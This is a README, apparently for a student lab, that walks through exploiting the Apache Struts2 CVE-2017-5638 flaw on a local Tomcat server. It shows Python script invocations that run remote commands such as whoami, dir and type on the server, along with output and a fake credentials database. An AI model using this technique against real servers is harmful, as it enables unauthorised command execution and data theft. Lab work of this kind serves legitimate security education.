# Exploiting Apache Struts2 CVE-2017-5638

This guide demonstrates how to exploit the Apache Struts2 vulnerability (CVE-2017-5638) using a locally configured Apache Tomcat server and Python scripts.

---

## **Setup Guide**

### **1. Prerequisites**
- All required MSI/ZIP files are included in the folder.
- Follow the setup instructions provided in this [Medium article](https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede).
- Note that all of this is run on a windows local machine, the articles assumes the server is hosted on a linux machine.

---

## **Steps to Execute**

### **Step 1: Navigate to the `bin` Directory**
```
cd <path-to-apache-tomcat-7.0.81-windows-x64\apache-tomcat-7.0.81\bin>
```


### **Step 2: Start Apache Tomcat**
Run the following command to start the server:
```
startup.bin
```

### **Step 3: Access the Application**
Open a browser and navigate to:
```
http://localhost:8080/str/
```

### **Step 4: Execute Commands Using Python Script**
Use the provided `str.py` script to execute commands on the server.

#### **Retrieve System Information**
```
python str.py http://localhost:8080/str/ "whoami"
python str.py http://localhost:8080/str/ "systeminfo"
```

#### **List Directory Contents**
```
python str.py http://localhost:8080/str/ "dir"
```

#### **Output Example**
```
Volume in drive C has no label.
Volume Serial Number is 0C74-F665

Directory of C:\Users\LENOVO\Downloads\SC3010 Presentation\apache-tomcat-7.0.81-windows-x64\apache-tomcat-7.0.81\bin

03/27/2025 08:24 PM <DIR> .
03/27/2025 08:24 PM <DIR> ..
03/27/2025 07:19 PM 28,503 bootstrap.jar
03/27/2025 07:19 PM 1,686 catalina-tasks.xml
03/27/2025 07:19 PM 14,028 catalina.bat
03/27/2025 07:19 PM 21,646 catalina.sh
03/27/2025 07:19 PM 204,944 commons-daemon-native.tar.gz
03/27/2025 07:19 PM 24,283 commons-daemon.jar
03/27/2025 07:19 PM 2,040 configtest.bat
03/27/2025 07:19 PM 1,922 configtest.sh
03/27/2025 07:19 PM 7,888 daemon.sh
03/27/2025 07:19 PM 2,091 digest.bat
03/27/2025 07:19 PM 1,965 digest.sh
03/27/2025 08:00 PM 453 fake_db.sql
03/27/2025 07:19 PM 6,308 service.bat
03/27/2025 ...
...
...
```
#### **Look for fake database infomation!**
```
python str.py http://localhost:8080/str/ "type fake_db.sql"
```
```
-- fake_db.sql

CREATE DATABASE IF NOT EXISTS fake_database;
USE fake_database;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(100)
);

INSERT INTO users (username, password, email) VALUES
('admin', 'password123', 'admin@example.com'),
('user1', '123456', 'user1@example.com'),
('user2', 'abcdef', 'user2@example.com');
```